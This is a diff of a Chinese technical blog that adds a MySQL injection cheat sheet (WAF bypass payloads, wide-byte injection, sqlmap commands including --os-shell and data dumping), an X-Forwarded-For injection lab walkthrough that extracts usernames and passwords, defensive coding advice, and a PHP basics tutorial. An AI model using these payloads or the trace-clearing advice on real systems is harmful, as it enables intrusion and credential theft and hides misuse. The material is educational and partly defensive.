+<h3 id="7-2-注释绕过"><a href="#7-2-注释绕过" class="headerlink" title="7.2 注释绕过"></a>7.2 注释绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 单行注释</span></span><br><span class="line">#       <span class="operator">%</span><span class="number">23</span>       ;<span class="operator">%</span><span class="number">00</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 内联注释</span></span><br><span class="line"><span class="comment">/*! SELECT */</span>   <span class="comment">/*!50000SELECT*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 换行绕过</span></span><br><span class="line"><span class="string">&#x27;%0AOR%0A&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="3-关闭连接"><a href="#3-关闭连接" class="headerlink" title="3. 关闭连接"></a>3. 关闭连接</h3><p>php</p>
-<p>运行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_close($conn);</span><br></pre></td></tr></table></figure>
+<h3 id="7-3-关键字绕过"><a href="#7-3-关键字绕过" class="headerlink" title="7.3 关键字绕过"></a>7.3 关键字绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 大小写混合</span></span><br><span class="line"><span class="keyword">UnIoN</span> <span class="keyword">SeLeCt</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 双写关键字</span></span><br><span class="line">UNIUNIONON SELSELECTECT</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 注释分割</span></span><br><span class="line">U<span class="comment">/**/</span>NI<span class="comment">/**/</span><span class="keyword">ON</span> S<span class="comment">/**/</span>ELECT</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 空白符替代</span></span><br><span class="line"><span class="operator">%</span><span class="number">09</span> <span class="operator">%</span><span class="number">0</span>a <span class="operator">%</span><span class="number">0</span>b <span class="operator">%</span><span class="number">0</span>c <span class="operator">%</span><span class="number">0</span>d <span class="operator">%</span>a0 <span class="comment">/**/</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="十、文件操作"><a href="#十、文件操作" class="headerlink" title="十、文件操作"></a>十、文件操作</h2><p>php</p>
-<p>运行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 读取文件</span><br><span class="line">$content = file_get_contents(&quot;test.txt&quot;);</span><br><span class="line"></span><br><span class="line">// 写入文件</span><br><span class="line">file_put_contents(&quot;test.txt&quot;,&quot;内容&quot;);</span><br><span class="line"></span><br><span class="line">// 打开/关闭</span><br><span class="line">$fp = fopen(&quot;test.txt&quot;,&quot;r&quot;);</span><br><span class="line">fclose($fp);</span><br></pre></td></tr></table></figure>
+<h3 id="7-4-引号绕过"><a href="#7-4-引号绕过" class="headerlink" title="7.4 引号绕过"></a>7.4 引号绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 使用十六进制</span></span><br><span class="line"><span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="number">0x61646d696e</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 宽字节注入</span></span><br><span class="line"><span class="operator">%</span>bf<span class="operator">%</span><span class="number">27</span>  <span class="operator">=</span><span class="operator">&gt;</span> <span class="operator">%</span>bf<span class="operator">%</span><span class="number">5</span>c<span class="operator">%</span><span class="number">27</span>  <span class="operator">=</span><span class="operator">&gt;</span> 縗<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 使用运算符</span></span><br><span class="line"><span class="string">WHERE &#x27;</span>abc<span class="string">&#x27; = &#x27;</span>ab<span class="string">&#x27; &#x27;</span>c<span class="string">&#x27;</span></span><br><span class="line"><span class="string">WHERE &#x27;</span>abc<span class="string">&#x27; LIKE &#x27;</span>ab<span class="string">&#x27; &#x27;</span>c<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="十一、面向对象（OOP）"><a href="#十一、面向对象（OOP）" class="headerlink" title="十一、面向对象（OOP）"></a>十一、面向对象（OOP）</h2><h3 id="1-类与对象"><a href="#1-类与对象" class="headerlink" title="1. 类与对象"></a>1. 类与对象</h3><p>php</p>
-<p>运行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class Person&#123;</span><br><span class="line">  public $name;</span><br><span class="line">  function say()&#123; echo &quot;说话&quot;; &#125;</span><br><span class="line">&#125;</span><br><span class="line">$p = new Person();</span><br><span class="line">$p-&gt;name = &quot;张三&quot;;</span><br><span class="line">$p-&gt;say();</span><br></pre></td></tr></table></figure>
+<h2 id="🔒-8-防御措施"><a href="#🔒-8-防御措施" class="headerlink" title="🔒 8. 防御措施"></a>🔒 8. 防御措施</h2><h3 id="8-1-输入验证"><a href="#8-1-输入验证" class="headerlink" title="8.1 输入验证"></a>8.1 输入验证</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 白名单验证</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-zA-Z0-9]+$/&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid input&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类型转换</span></span><br><span class="line"><span class="variable">$id</span> = (<span class="keyword">int</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br></pre></td></tr></table></figure>
 
-<h3 id="2-关键字"><a href="#2-关键字" class="headerlink" title="2. 关键字"></a>2. 关键字</h3><ul>
-<li><code>public</code>：公共权限</li>
-<li><code>private</code>：私有权限</li>
-<li><code>protected</code>：受保护权限</li>
-<li><code>$this</code>：代表当前对象</li>
-<li><code>new</code>：实例化对象</li>
-</ul>
-<h2 id="十二、安全与常用要点"><a href="#十二、安全与常用要点" class="headerlink" title="十二、安全与常用要点"></a>十二、安全与常用要点</h2><ol>
-<li><strong>防 SQL 注入</strong>：使用预处理语句</li>
-<li><strong>防 XSS</strong>：输出用 <code>htmlspecialchars()</code></li>
-<li><strong>文件上传</strong>：校验类型、大小、重命名</li>
-<li><strong>错误处理</strong>：<code>try-catch</code> 捕获异常</li>
+<h3 id="8-2-参数化查询"><a href="#8-2-参数化查询" class="headerlink" title="8.2 参数化查询"></a>8.2 参数化查询</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PDO预处理</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$username</span>, <span class="variable">$password</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// MySQLi预处理</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE username = ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-3-安全配置"><a href="#8-3-安全配置" class="headerlink" title="8.3 安全配置"></a>8.3 安全配置</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># php.ini配置</span></span><br><span class="line"><span class="attr">magic_quotes_gpc</span> = <span class="literal">Off</span></span><br><span class="line"><span class="attr">display_errors</span> = <span class="literal">Off</span></span><br><span class="line"><span class="attr">allow_url_include</span> = <span class="literal">Off</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL配置</span></span><br><span class="line"><span class="attr">secure_file_priv</span> = /tmp/</span><br><span class="line"><span class="attr">local_infile</span> = <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="📊-9-实战流程"><a href="#📊-9-实战流程" class="headerlink" title="📊 9. 实战流程"></a>📊 9. 实战流程</h2><h3 id="9-1-基本流程"><a href="#9-1-基本流程" class="headerlink" title="9.1 基本流程"></a>9.1 基本流程</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 寻找注入点</span><br><span class="line"><span class="bullet">2.</span> 判断注入类型</span><br><span class="line"><span class="bullet">3.</span> 获取数据库信息</span><br><span class="line"><span class="bullet">4.</span> 枚举表结构</span><br><span class="line"><span class="bullet">5.</span> 提取目标数据</span><br><span class="line"><span class="bullet">6.</span> 提权/写入文件</span><br></pre></td></tr></table></figure>
+
+<h3 id="9-2-自动化工具"><a href="#9-2-自动化工具" class="headerlink" title="9.2 自动化工具"></a>9.2 自动化工具</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SQLMap基本使用</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://target.com/page.php?id=1&quot;</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> --data=<span class="string">&quot;user=admin&amp;pass=123&quot;</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://target.com&quot;</span> --cookie=<span class="string">&quot;id=1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用参数</span></span><br><span class="line">--dbs               <span class="comment"># 枚举数据库</span></span><br><span class="line">--tables -D dbname  <span class="comment"># 枚举表</span></span><br><span class="line">--columns -T table  <span class="comment"># 枚举列</span></span><br><span class="line">--dump -C column    <span class="comment"># 导出数据</span></span><br><span class="line">--os-shell         <span class="comment"># 获取系统shell</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="⚠️-10-注意事项"><a href="#⚠️-10-注意事项" class="headerlink" title="⚠️ 10. 注意事项"></a>⚠️ 10. 注意事项</h2><ol>
+<li><strong>合法授权</strong> - 只在授权范围内测试</li>
+<li><strong>最小影响</strong> - 避免对系统造成破坏</li>
+<li><strong>数据备份</strong> - 测试前做好备份</li>
+<li><strong>日志清理</strong> - 清除测试痕迹</li>
+<li><strong>遵守法律</strong> - 不用于非法用途</li>
 </ol>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/04/27/php/" data-id="cuidFTRrY85y6dVXyvg3hgB_m" data-title="php 语法基础" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://example.com/2026/04/28/mysql%E6%B3%A8%E5%85%A5/" data-id="cuidts4OfFNsLFCX7K2It0SgM" data-title="" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/" rel="tag">php</a></li></ul>
+    </footer>
+  </div>
+  
+</article>
 
+
+
+  
+    <article id="post-xff注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/04/28/xff%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time class="dt-published" datetime="2026-04-28T15:11:28.175Z" itemprop="datePublished">2026-04-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="xff注入"><a href="#xff注入" class="headerlink" title="xff注入"></a>xff注入</h1><p>测试思路</p>
+<p>1、登录后台提示ip信息不正确，这种情况一般是x-forwarded-for读取客户端ip</p>
+<p>2、通过在数据包添加x-forwarded-for:1.1.1.1看 respone包中是否存在1.1.1.1</p>
+<p>3、如果存在则证明用x-forwarded-for读取客户端数据，则存在注入漏洞</p>
+<p>4、通过在登录框数据包中添加x-forwarded-for:*，用sqlmap 跑注入,跑数据库名，表名，字段名，字段内容</p>
+<p>测试步骤</p>
+<p>1、登陆随意输入密码，返回提示</p>
+<p><img src="https://www.mozhe.cn/uploads/2020/04/14/15868346938cea55.png" alt="img"></p>
+<p> 2、在数据包添加x-forwarded-for:1.1.1.1看 respone包中是否存在1.1.1.1</p>
+<p><img src="https://www.mozhe.cn/uploads/2020/04/14/15868346945747a0.png" alt="img"></p>
+<p> <img src="https://www.mozhe.cn/uploads/2020/04/14/1586834694d37124.png" alt="img"></p>
+<p> 3、存在此漏洞，保存请求包到1.txt里（X-Forwarded-For值改为*）</p>
+<p><img src="https://www.mozhe.cn/uploads/2020/04/14/158683469669cb3e.png" alt="img"></p>
+<p> 4、使用sqlmap开始跑，</p>
+<p>  1）sqlmap爆出库名：sqlmap -r d:&#x2F;aaa.txt –db –batch</p>
+<p>  2）表名:sqlmap -r d:&#x2F;aaa.txt -D webcalender –tables –batch</p>
+<p>  3）字段：sqlmap -r d:&#x2F;aa.txt -D webcalender -T user –columns –batch </p>
+<p>  4）字段内容：sqlmap -r d:&#x2F;aa.txt -D webcalender -T user -C ‘user,password’ –batch</p>
+<p>获取账号与密码</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/04/28/xff%E6%B3%A8%E5%85%A5/" data-id="cuid-HLeonygo4Y67DAjIhPL9" data-title="" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
     </footer>
   </div>
   
@@ -470,11 +414,202 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/04/27/markdown/" data-id="cuidl9JyC99ao-BZeKGtLtzu1" data-title="Markdown 语法基础" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://example.com/2026/04/27/markdown/" data-id="cuidhmVW8UK3eETuuf4rEsIdD" data-title="Markdown 语法基础" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Markdown/" rel="tag">Markdown</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-php" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/04/27/php/" class="article-date">
+  <time class="dt-published" datetime="2026-04-26T16:00:00.000Z" itemprop="datePublished">2026-04-27</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/">技术笔记</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/04/27/php/">php 语法基础</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="一、PHP-基础入门"><a href="#一、PHP-基础入门" class="headerlink" title="一、PHP 基础入门"></a>一、PHP 基础入门</h2><h3 id="1-基本语法"><a href="#1-基本语法" class="headerlink" title="1. 基本语法"></a>1. 基本语法</h3><ul>
+<li>PHP 代码以 <code>&lt;?php</code> 开始，<code>?&gt;</code> 结束，可嵌入 HTML 中</li>
+<li>语句必须以<strong>分号 <code>;</code></strong> 结尾</li>
+<li>单行注释：<code>// 注释内容</code></li>
+<li>多行注释：<code>/* 注释内容 */</code></li>
+</ul>
+<p>php</p>
+<p>运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 输出内容</span><br><span class="line">echo &quot;Hello PHP!&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-输出语句"><a href="#2-输出语句" class="headerlink" title="2. 输出语句"></a>2. 输出语句</h3><ul>
+<li><code>echo</code>：最常用，输出一个或多个字符串，<strong>无返回值</strong></li>
+<li><code>print</code>：输出一个字符串，有返回值（效率低于 echo）</li>
+<li><code>print_r()</code>：打印变量信息（适合数组 &#x2F; 对象）</li>
+<li><code>var_dump()</code>：打印变量类型 + 值（调试专用）</li>
+</ul>
+<h2 id="二、变量与数据类型"><a href="#二、变量与数据类型" class="headerlink" title="二、变量与数据类型"></a>二、变量与数据类型</h2><h3 id="1-变量规则"><a href="#1-变量规则" class="headerlink" title="1. 变量规则"></a>1. 变量规则</h3><ul>
+<li>以 <code>$</code> 符号开头，如 <code>$name</code></li>
+<li>区分大小写，不能以数字开头</li>
+<li>弱类型语言：<strong>无需声明类型</strong>，自动转换</li>
+</ul>
+<h3 id="2-8-种数据类型"><a href="#2-8-种数据类型" class="headerlink" title="2. 8 种数据类型"></a>2. 8 种数据类型</h3><h4 id="标量类型（4-种）"><a href="#标量类型（4-种）" class="headerlink" title="标量类型（4 种）"></a>标量类型（4 种）</h4><ol>
+<li><strong>字符串</strong>：<code>$str = &quot;abc&quot;;</code></li>
+<li><strong>整型</strong>：<code>$num = 100;</code></li>
+<li><strong>浮点型</strong>：<code>$float = 3.14;</code></li>
+<li><strong>布尔型</strong>：<code>$bool = true / false;</code></li>
+</ol>
+<h4 id="复合类型（2-种）"><a href="#复合类型（2-种）" class="headerlink" title="复合类型（2 种）"></a>复合类型（2 种）</h4><ol>
+<li><strong>数组</strong>：<code>$arr = [1,2,3];</code></li>
+<li><strong>对象</strong>：面向对象使用</li>
+</ol>
+<h4 id="特殊类型（2-种）"><a href="#特殊类型（2-种）" class="headerlink" title="特殊类型（2 种）"></a>特殊类型（2 种）</h4><ol>
+<li><strong>NULL</strong>：空值</li>
+<li><strong>资源</strong>：文件、数据库连接等</li>
+</ol>
+<h3 id="3-常量"><a href="#3-常量" class="headerlink" title="3. 常量"></a>3. 常量</h3><ul>
+<li>定义后<strong>不可修改</strong>，全局有效</li>
+</ul>
+<p>php</p>
+<p>运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">define(&quot;NAME&quot;, &quot;PHP学习&quot;);</span><br><span class="line">echo NAME;</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、运算符"><a href="#三、运算符" class="headerlink" title="三、运算符"></a>三、运算符</h2><h3 id="1-算术运算符"><a href="#1-算术运算符" class="headerlink" title="1. 算术运算符"></a>1. 算术运算符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ - * / % ++ --</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-比较运算符"><a href="#2-比较运算符" class="headerlink" title="2. 比较运算符"></a>2. 比较运算符</h3><p><code>== 等于</code>、<code>=== 全等于（值+类型都相同）</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!= &gt; &lt; &gt;= &lt;=</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-逻辑运算符"><a href="#3-逻辑运算符" class="headerlink" title="3. 逻辑运算符"></a>3. 逻辑运算符</h3><p><code>&amp;&amp; 与</code>、<code>|| 或</code>、<code>! 非</code></p>
+<h3 id="4-字符串运算符"><a href="#4-字符串运算符" class="headerlink" title="4. 字符串运算符"></a>4. 字符串运算符</h3><p><code>.</code> 拼接字符串</p>
+<p>php</p>
+<p>运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Hello&quot; . &quot; PHP&quot;; // 输出 Hello PHP</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、流程控制"><a href="#四、流程控制" class="headerlink" title="四、流程控制"></a>四、流程控制</h2><h3 id="1-条件判断"><a href="#1-条件判断" class="headerlink" title="1. 条件判断"></a>1. 条件判断</h3><p>php</p>
+<p>运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// if-else</span><br><span class="line">if($score &gt;= 60)&#123;</span><br><span class="line">  echo &quot;及格&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">  echo &quot;不及格&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// switch</span><br><span class="line">switch($num)&#123;</span><br><span class="line">  case 1: echo &quot;一&quot;; break;</span><br><span class="line">  default: echo &quot;其他&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-循环结构"><a href="#2-循环结构" class="headerlink" title="2. 循环结构"></a>2. 循环结构</h3><p>php</p>
+<p>运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// for 循环</span><br><span class="line">for($i=0; $i&lt;5; $i++)&#123; echo $i; &#125;</span><br><span class="line"></span><br><span class="line">// while 循环</span><br><span class="line">$i=0;</span><br><span class="line">while($i&lt;5)&#123; $i++; &#125;</span><br><span class="line"></span><br><span class="line">// foreach（遍历数组专用）</span><br><span class="line">foreach($arr as $val)&#123;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="五、数组"><a href="#五、数组" class="headerlink" title="五、数组"></a>五、数组</h2><h3 id="1-数组分类"><a href="#1-数组分类" class="headerlink" title="1. 数组分类"></a>1. 数组分类</h3><ol>
+<li><strong>索引数组</strong>：下标为数字</li>
+</ol>
+<p>php</p>
+<p>运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$arr = [10, 20, 30];</span><br><span class="line">echo $arr[0]; // 10</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><strong>关联数组</strong>：自定义键名</li>
+</ol>
+<p>php</p>
+<p>运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$user = [&quot;name&quot;=&gt;&quot;张三&quot;,&quot;age&quot;=&gt;20];</span><br><span class="line">echo $user[&quot;name&quot;];</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-常用数组函数"><a href="#2-常用数组函数" class="headerlink" title="2. 常用数组函数"></a>2. 常用数组函数</h3><ul>
+<li><code>count()</code>：获取数组长度</li>
+<li><code>array_push()</code>：尾部添加元素</li>
+<li><code>array_pop()</code>：删除尾部元素</li>
+<li><code>in_array()</code>：判断值是否在数组中</li>
+<li><code>implode()</code>：数组转字符串</li>
+<li><code>explode()</code>：字符串转数组</li>
+</ul>
+<h2 id="六、函数"><a href="#六、函数" class="headerlink" title="六、函数"></a>六、函数</h2><h3 id="1-自定义函数"><a href="#1-自定义函数" class="headerlink" title="1. 自定义函数"></a>1. 自定义函数</h3><p>php</p>
+<p>运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 定义</span><br><span class="line">function add($a, $b)&#123;</span><br><span class="line">  return $a + $b;</span><br><span class="line">&#125;</span><br><span class="line">// 调用</span><br><span class="line">echo add(1,2);</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-常用系统函数"><a href="#2-常用系统函数" class="headerlink" title="2. 常用系统函数"></a>2. 常用系统函数</h3><ul>
+<li>字符串：<code>strlen()</code>、<code>trim()</code>、<code>str_replace()</code></li>
+<li>时间：<code>time()</code>、<code>date(&quot;Y-m-d H:i:s&quot;)</code></li>
+<li>文件：<code>file_get_contents()</code>、<code>file_put_contents()</code></li>
+</ul>
+<h2 id="七、表单与超全局变量"><a href="#七、表单与超全局变量" class="headerlink" title="七、表单与超全局变量"></a>七、表单与超全局变量</h2><h3 id="1-接收表单数据"><a href="#1-接收表单数据" class="headerlink" title="1. 接收表单数据"></a>1. 接收表单数据</h3><ul>
+<li><code>$_GET</code>：接收 GET 方式提交的数据</li>
+<li><code>$_POST</code>：接收 POST 方式提交的数据</li>
+<li><code>$_REQUEST</code>：同时接收 GET&#x2F;POST</li>
+</ul>
+<p>php</p>
+<p>运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$name = $_POST[&quot;username&quot;];</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-其他超全局变量"><a href="#2-其他超全局变量" class="headerlink" title="2. 其他超全局变量"></a>2. 其他超全局变量</h3><ul>
+<li><code>$_SERVER</code>：服务器信息</li>
+<li><code>$_SESSION</code>：会话数据</li>
+<li><code>$_COOKIE</code>：Cookie 数据</li>
+</ul>
+<h2 id="八、会话与-Cookie"><a href="#八、会话与-Cookie" class="headerlink" title="八、会话与 Cookie"></a>八、会话与 Cookie</h2><h3 id="1-Session（服务器存储）"><a href="#1-Session（服务器存储）" class="headerlink" title="1. Session（服务器存储）"></a>1. Session（服务器存储）</h3><p>php</p>
+<p>运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session_start(); // 必须开头</span><br><span class="line">$_SESSION[&quot;user&quot;] = &quot;张三&quot;; // 赋值</span><br><span class="line">unset($_SESSION[&quot;user&quot;]); // 删除</span><br><span class="line">session_destroy(); // 销毁会话</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-Cookie（客户端存储）"><a href="#2-Cookie（客户端存储）" class="headerlink" title="2. Cookie（客户端存储）"></a>2. Cookie（客户端存储）</h3><p>php</p>
+<p>运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setcookie(&quot;name&quot;,&quot;张三&quot;,time()+3600); // 设置</span><br><span class="line">echo $_COOKIE[&quot;name&quot;]; // 获取</span><br><span class="line">setcookie(&quot;name&quot;,&quot;&quot;,time()-1); // 删除</span><br></pre></td></tr></table></figure>
+
+<h2 id="九、MySQL-数据库操作（MySQLi）"><a href="#九、MySQL-数据库操作（MySQLi）" class="headerlink" title="九、MySQL 数据库操作（MySQLi）"></a>九、MySQL 数据库操作（MySQLi）</h2><h3 id="1-连接数据库"><a href="#1-连接数据库" class="headerlink" title="1. 连接数据库"></a>1. 连接数据库</h3><p>php</p>
+<p>运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$conn = mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;密码&quot;,&quot;库名&quot;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-执行-SQL"><a href="#2-执行-SQL" class="headerlink" title="2. 执行 SQL"></a>2. 执行 SQL</h3><p>php</p>
+<p>运行</p>
